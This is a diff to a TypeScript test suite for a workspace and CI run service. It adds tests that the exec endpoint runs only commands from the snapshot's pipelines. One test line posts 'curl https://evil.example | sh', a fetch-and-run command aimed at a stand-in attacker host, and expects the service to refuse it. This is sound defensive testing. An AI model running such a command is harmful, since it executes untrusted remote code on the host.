@@ -78,6 +78,7 @@ beforeEach(async () => {
   const workspaces: WorkspaceRegistry = new WorkspaceRegistry(async () => workspace, {
     maxActive: 1,
     idleMs: 60_000,
+    maxLifetimeMs: 60_000,
     inUse: () => workspaces.active
   })
   server = createServer(
@@ -151,8 +152,22 @@ describe('run service', () => {
 })
 
 describe('workspaces', () => {
+  const pipelines = [{ id: 'ci', name: 'CI', nodes: [step('a', 'shell', 'npm test'), step('b', 'shell', 'echo ${a}')] }]
   const open = async (token?: string) =>
-    call('/v1/workspaces', { method: 'POST', body: new Uint8Array(snapshot([])), token })
+    call('/v1/workspaces', { method: 'POST', body: new Uint8Array(snapshot(pipelines)), token })
+
+  it('runs only the steps of the pipelines in its snapshot', async () => {
+    const { id } = (await (await open()).json()) as { id: string }
+    const refused = await call(`/v1/workspaces/${id}/exec`, { method: 'POST', body: 'curl https://evil.example | sh' })
+    expect(refused.status).toBe(403)
+    expect(workspace.exec).not.toHaveBeenCalledWith('curl https://evil.example | sh', expect.any(Function))
+    const filled = await call(`/v1/workspaces/${id}/exec`, { method: 'POST', body: "echo 'it'\\''s; fine'" })
+    expect(filled.status).toBe(200)
+  })
+
+  it('refuses a snapshot without a pipelines file', async () => {
+    expect((await call('/v1/workspaces', { method: 'POST', body: 'not a tarball' })).status).toBe(422)
+  })
 
   it('execs commands and streams output with the exit code, then closes', async () => {
     const created = await open()
